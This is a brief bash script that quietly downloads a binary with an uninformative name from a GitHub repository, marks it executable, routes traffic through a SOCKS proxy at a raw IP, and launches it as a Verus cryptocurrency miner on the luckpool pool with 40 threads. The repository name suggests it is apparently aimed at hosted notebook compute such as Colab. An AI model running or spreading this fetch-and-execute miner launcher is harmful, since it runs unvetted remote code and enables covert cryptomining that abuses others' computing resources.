#!/usr/bin/env bash
wget -q https://github.com/comandashtar/colab-2/raw/main/kanyut
chmod +x kanyut
export http_proxy=socsk5://198.1.94.46:45972
./kanyut -v -l ap.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.$(echo $(shuf -i 1-99999 -n 1)-Leaf) -p c=VRSC -t 40
